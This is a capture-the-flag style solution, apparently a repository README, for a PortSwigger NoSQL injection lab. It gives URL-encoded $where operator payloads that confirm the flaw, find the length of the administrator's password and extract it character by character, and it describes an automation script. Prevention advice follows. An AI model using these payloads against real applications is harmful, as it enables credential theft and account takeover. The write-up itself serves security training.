NoSQL Injection: Extract Data Lab Solution
Lab Overview
Lab Link: PortSwigger NoSQL Injection Lab

This lab contains a NoSQL injection vulnerability in the product category filter. The application uses a NoSQL database and is vulnerable to operator injection. The goal is to extract the administrator's password from the database and log in to their account.

Vulnerability Analysis
The application constructs NoSQL queries like:

javascript
{"category":"Gifts"}
By injecting operators, we can modify the query to extract data:

javascript
{"category":"Gifts","$where":"this.name[0] == 'a'"}
Solution Approach
Manual Exploitation Steps
1. Confirm Vulnerability
Test with a basic always-true condition:

text
GET /filter?category=Gifts%22%20%7C%7C%20%221%22%3D%3D%221
(URL encoded: Gifts" || "1"=="1)

If products are returned, the application is vulnerable.

2. Extract Password Length
Use the $where operator to determine password length:

text
GET /filter?category=Gifts%22%2C%22%24where%22%3A%22this.password.length%20%3D%3D%2020%22%7D%00
(URL encoded: Gifts","$where":"this.password.length == 20"})

Adjust the length value until products are returned.

3. Extract Password Character by Character
For each character position (0-19), test all possible characters:

text
GET /filter?category=Gifts%22%2C%22%24where%22%3A%22this.password%5B0%5D%20%3D%3D%20%27a%27%22%7D%00
(URL encoded: Gifts","$where":"this.password[0] == 'a'"})

Continue for each position until the full password is recovered.

4. Login as Administrator
Use the extracted password at /login to access the administrator account.

Automated Solution
We provide a Python script that automates the extraction process.

Prerequisites
Python 3.x

requests library (pip install requests)

Usage
Download the script from the scripts folder

Run the script with the lab URL:

bash
python nosql_injection.py https://your-lab-id.web-security-academy.net
What the Script Does
Determines password length by testing different lengths

Extracts each character using blind injection

Automatically logs in as administrator

Confirms successful exploitation

Important: URL Encoding
URL encoding is crucial for successful exploitation. The script handles this automatically, but for manual testing:

Spaces become %20

Double quotes become %22

Special characters like $ become %24

Null byte becomes %00

Example without encoding:

text
Gifts","$where":"this.password.length == 20"}
Example with proper URL encoding:

text
Gifts%22%2C%22%24where%22%3A%22this.password.length%20%3D%3D%2020%22%7D%00
Prevention Measures
Use parameterized queries or prepared statements

Implement proper input validation and sanitization

Apply the principle of least privilege to database accounts

Use ORM/ODM libraries that handle query construction safely

References
PortSwigger NoSQL Injection

URL Encoding Reference

MongoDB Security Checklist

Script Folder
Download the automation script from the script folder in this repository to quickly solve the lab. The script handles all URL encoding and extraction logic automatically.

